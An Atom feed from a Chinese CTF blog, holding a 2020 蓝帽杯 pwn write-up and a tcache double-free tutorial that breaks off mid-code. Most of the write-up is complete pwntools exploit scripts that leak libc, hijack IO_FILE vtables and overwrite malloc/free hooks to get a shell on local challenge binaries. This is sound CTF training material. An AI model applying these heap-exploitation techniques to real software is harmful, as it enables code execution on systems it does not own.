<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The lair of C0yo7e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c0yo7e.github.io/"/>
  <updated>2020-08-09T09:37:54.108Z</updated>
  <id>https://c0yo7e.github.io/</id>
  
  <author>
    <name>C0yo7e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>蓝帽杯202020-pwn1&amp;pwn3复现</title>
    <link href="https://c0yo7e.github.io/2020/08/09/%E8%93%9D%E5%B8%BD%E6%9D%AF202020-pwn1/"/>
    <id>https://c0yo7e.github.io/2020/08/09/蓝帽杯202020-pwn1/</id>
    <published>2020-08-09T09:31:24.000Z</published>
    <updated>2020-08-09T09:37:54.108Z</updated>
    
    <content type="html"><![CDATA[<p>前两天队友们在打蓝帽杯，非警校人员只能赛后看题了</p><p>只做了pwn1和pwn3（应该是这个顺序<br>两题都涉及了IO_FILE的知识点利用，刚好最近也在刷IO_FILE就做来练练手了</p><h3 id="camp-pwn1"><a href="#camp-pwn1" class="headerlink" title="camp(pwn1)"></a>camp(pwn1)</h3><p>这真的是赤裸裸考IO_FILE的题啊，完全不需要别的操作，纯往里写，就靠结构知识的感觉</p><p>大概是用stdin来leak出libc的地址，然后改stderr的vtable，执行exit的时候会执行IO_flush_all_lockp</p><p>跳转到vtable+0x18处执行IO_file_overflow函数<br>我们就填充fake_vtable实现调用one_gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def stdout_0(size,content):</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;size:\n&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;content:\n&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def stdin_0(size,content):</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;\n&quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;size:\n&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;content:\n&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def stderr_0(size,content):</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;\n&quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;size:\n&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;content:\n&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def logs():</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">def clean():</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">p.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># stdin_0(0xf0,&apos;a&apos;*0xf0)</span><br><span class="line">stdin_0(0x80,&apos;a\n&apos;)</span><br><span class="line">stdin_0(0x80,&apos;a\n&apos;)</span><br><span class="line"># stdin_0(0x80,&apos;a\n&apos;)</span><br><span class="line">clean()</span><br><span class="line"># stdout_0(64,p64(elf.got[&apos;write&apos;]))</span><br><span class="line">stdin_0(0x80,&apos;a&apos;)</span><br><span class="line">logs()</span><br><span class="line">p.recvuntil(&quot;stdin\n&quot;)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x41</span><br><span class="line">print hex(main_arena)</span><br><span class="line"></span><br><span class="line"># stdin_0(0x80,&apos;a\n&apos;)</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line">jump=libc_base+libc.symbols[&apos;_IO_file_jumps&apos;]+0xc0</span><br><span class="line">fake_vtable = libc_base + 0x3c5600-8</span><br><span class="line"># fake_vtable = libc_base +0x3c4998-8</span><br><span class="line">stdout = libc_base + 0x3c5620</span><br><span class="line">onegadget=libc_base+0xf02a4</span><br><span class="line"># py = &apos;\x00&apos; + p64(libc_base+0x3c55e0) + p64(0)*3+p64(0x1)+p64(0)+p64(onegadget)+p64(fake_vtable)</span><br><span class="line"></span><br><span class="line">stderr = p64(0x00000000fbad2087)+p64(libc_base+0x3c55c3)*7</span><br><span class="line">stderr += p64(libc_base+0x3c55c3+1)+p64(0)*4+p64(stdout)+p64(2)+p64(0xffffffffffffffff)+p64(0)</span><br><span class="line">stderr += p64(libc_base+0x3c6770)+p64(0xffffffffffffffff)+p64(0)</span><br><span class="line">stderr += p64(libc_base+0x3c55e0) + p64(0)*3+p64(1)+p64(0)+p64(onegadget)+p64(fake_vtable)#+p64(0x00000000ffffffff)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line">stderr_0(len(stderr),stderr)</span><br><span class="line"># stdin_0(0x180,&apos;b&apos;)</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;size:\n&quot;)</span><br><span class="line">p.sendline(str(0x180))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>听说远程很狗，不打比赛就没体验到，本地通了就over吧</p><h3 id="safebox-pwn3"><a href="#safebox-pwn3" class="headerlink" title="safebox(pwn3)"></a>safebox(pwn3)</h3><p>一开始我还以为是glibc2.23的版本呢<br>所以用2.23做了一遍，由于2.23对size的检查问题，fakechunk的size一定要符合条件，所以最后getshell不能改free_hook，我就改了malloc为one_gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line"># libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size,content):</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;&gt;&apos;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;len:&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;content:&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;&gt;&apos;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x18,&apos;0&apos;)</span><br><span class="line">add(1,0x108,&apos;a&apos;)</span><br><span class="line">add(2,0x60,&apos;b&apos;)</span><br><span class="line">add(3,0x60,&apos;c&apos;)</span><br><span class="line">add(4,0xf8,&apos;c&apos;)</span><br><span class="line">add(5,0x20,&apos;d&apos;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">add(0,0x18,&apos;a&apos;*0x18+&apos;\xf1&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line"># delete(0)</span><br><span class="line"></span><br><span class="line"># add(0,0x30,&apos;a&apos;*0x18+p64(0x91)+p16(0x2620-0x41))</span><br><span class="line"></span><br><span class="line">add(1,0x108,&apos;a&apos;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># delete(4)</span><br><span class="line">add(2,0x70,p16(0x2620-0x43))</span><br><span class="line">delete(1)</span><br><span class="line">add(1,0x108,&apos;a&apos;*0x108+&apos;\x71&apos;)</span><br><span class="line">add(3,0x60,&apos;b&apos;)</span><br><span class="line">add(6,0x60,&apos;c&apos;)</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x33+p64(0xfbad1800)+p64(0)*3+&apos;\x00&apos;</span><br><span class="line">add(7,0x68,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(&apos;\x7f&apos;)[-6:].ljust(8,&apos;\x00&apos;))-0x3c5600</span><br><span class="line">print hex(libc_base)</span><br><span class="line">system = libc_base + 0x44e30</span><br><span class="line">free_hook = libc_base + 0x3c67a8</span><br><span class="line">malloc_hook = libc_base+0x3c4b10</span><br><span class="line">onegadget=libc_base+0xf1207</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(8))</span><br><span class="line">p.recvuntil(&quot;len:&quot;)</span><br><span class="line">p.sendline(str(0x50))</span><br><span class="line">p.recvuntil(&quot;content:&quot;)</span><br><span class="line">p.send(&apos;a&apos;)</span><br><span class="line">add(8,0x18,&apos;a&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(9,0x108,&apos;b&apos;)</span><br><span class="line">add(10,0x68,&apos;c&apos;)</span><br><span class="line">add(11,0x68,&apos;d&apos;)</span><br><span class="line">add(12,0x68,&apos;/bin/sh\x00&apos;)</span><br><span class="line"># add(13,0x18,&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">add(0,0x18,&apos;a&apos;*0x18+&apos;\xf1&apos;)</span><br><span class="line">delete(10)</span><br><span class="line">delete(11)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">add(9,0x108,&apos;b&apos;)</span><br><span class="line">add(10,0x70,p64(malloc_hook-0x23))</span><br><span class="line">delete(9)</span><br><span class="line">add(9,0x108,&apos;a&apos;*0x108+&apos;\x71&apos;)</span><br><span class="line">add(11,0x68,&apos;d&apos;)</span><br><span class="line">add(13,0x68,&apos;ddd&apos;)</span><br><span class="line">add(14,0x60,&apos;a&apos;*0x13+p64(onegadget))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(15))</span><br><span class="line">p.recvuntil(&quot;len:&quot;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>后来发现，原来是2.27的题，其实也没什么不一样，就是要leak地址的话得先malloc largebin<br>然后可以直接覆写低两位的地址，不考虑size位<br>所以我们可以覆盖free_hook再delet实现getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line"># libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size,content):</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;&gt;&apos;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;len:&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;content:&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;&gt;&apos;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"></span><br><span class="line">add(0,0x68,&apos;0&apos;)</span><br><span class="line">add(1,0x408,&apos;a&apos;)</span><br><span class="line">add(2,0x60,&apos;b&apos;)</span><br><span class="line">add(3,0x60,&apos;c&apos;)</span><br><span class="line">add(4,0xf8,&apos;c&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">add(0,0x68,&apos;a&apos;*0x68+&apos;\xf1&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(1,0x408,&apos;a&apos;)</span><br><span class="line">add(2,0x70,p16(0x4760))</span><br><span class="line">add(5,0x60,&apos;b&apos;)</span><br><span class="line">add(6,0x60,&apos;c&apos;)</span><br><span class="line"></span><br><span class="line">payload=p64(0xfbad1800)+p64(0)*3+&apos;\x00&apos;</span><br><span class="line">add(7,0x60,payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">libc_base = u64(p.recvuntil(&apos;\x7f&apos;)[-6:].ljust(8,&apos;\x00&apos;))-0x3ed8b0</span><br><span class="line">print hex(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[&apos;system&apos;]+0xa0</span><br><span class="line">print hex(system)</span><br><span class="line">free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">print hex(free_hook)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;idx:&quot;)</span><br><span class="line">p.sendline(str(8))</span><br><span class="line">p.recvuntil(&quot;len:&quot;)</span><br><span class="line">p.sendline(str(0x50))</span><br><span class="line">p.recvuntil(&quot;content:&quot;)</span><br><span class="line">p.send(&apos;a&apos;)</span><br><span class="line"># add(8,0x18,&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(8,0x88,&apos;a&apos;)</span><br><span class="line">add(9,0x108,&apos;b&apos;)</span><br><span class="line">add(10,0x70,&apos;c&apos;)</span><br><span class="line">add(11,0x70,&apos;d&apos;)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">add(8,0x88,&apos;a&apos;*0x88+&apos;\x91&apos;)</span><br><span class="line"></span><br><span class="line">delete(10)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * 0x100 + p64(0) + p64(0x80) + p64(free_hook)</span><br><span class="line">add(9,0x180,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0x4f2c5</span><br><span class="line">add(10,0x70,&apos;/bin/sh\x00&apos;) </span><br><span class="line">add(12,0x70,p64(system))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(10)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">libc=ELF(&apos;./libc-2.27.so&apos;)</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">break</span><br><span class="line">except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两天队友们在打蓝帽杯，非警校人员只能赛后看题了&lt;/p&gt;
&lt;p&gt;只做了pwn1和pwn3（应该是这个顺序&lt;br&gt;两题都涉及了IO_FILE的知识点利用，刚好最近也在刷IO_FILE就做来练练手了&lt;/p&gt;
&lt;h3 id=&quot;camp-pwn1&quot;&gt;&lt;a href=&quot;#camp-p
      
    
    </summary>
    
    
    
      <category term="wp" scheme="https://c0yo7e.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>tcache浅析</title>
    <link href="https://c0yo7e.github.io/2020/08/08/tcache%E6%B5%85%E6%9E%90/"/>
    <id>https://c0yo7e.github.io/2020/08/08/tcache浅析/</id>
    <published>2020-08-08T12:22:23.000Z</published>
    <updated>2020-08-08T12:24:26.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tcache-glibc2-27"><a href="#tcache-glibc2-27" class="headerlink" title="tcache glibc2.27"></a>tcache glibc2.27</h2><p>glibc2.27版本的tcache是可以double free处理的，利用起来就很方便</p><p>tcache会把之前malloc的chunk在free完之后写入tcache list里面</p><a id="more"></a><p>常规操作的话，我们需要将chunk写进unsorted bin才能leak出main_area的地址<br>而想要跳出tcache list 可以利用double free将a-&gt;a的形式写入tcache list (<code>free 同一个 chunk</code>)<br>这个时候，指针count为2，<br>在malloc同一个大小，不进行写入参数时，可以不断地往那个tcache list里拿那个地址，并且count -1<br>使得count为-1时，不再写入tcache list，而是写进unsorted bin list<br>接下来就可以正常泄露libc了</p><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="V-amp-N公开赛2020-easyTheap"><a href="#V-amp-N公开赛2020-easyTheap" class="headerlink" title="V&amp;N公开赛2020 easyTheap"></a>V&amp;N公开赛2020 easyTheap</h4><p>最简单的double free + tcache</p><p>要想leak出libc的地址就要把chunk free进unsortedbin里<br>这里就要用了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment">#tcache-1</span></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment">#tcache-2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x260</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2 tcache-1</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#3 tcache-0</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4 tcache- -1-&gt;绕过</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure><h4 id="SCTF2019-one-heap"><a href="#SCTF2019-one-heap" class="headerlink" title="SCTF2019 one_heap"></a>SCTF2019 one_heap</h4><p>这题也是要先绕过tcache来leak地址的<br>第一步操作是一样的</p><p>具体exp见<a href="https://c0yo7e.github.io/2020/08/01/IO-FILE-leakaddr/#2019-one-heap">这里</a></p><h2 id="tcache-glibc2-29"><a href="#tcache-glibc2-29" class="headerlink" title="tcache glibc2.29"></a>tcache glibc2.29</h2><p>结构体新增了key指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">/* 新增指针 */</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If 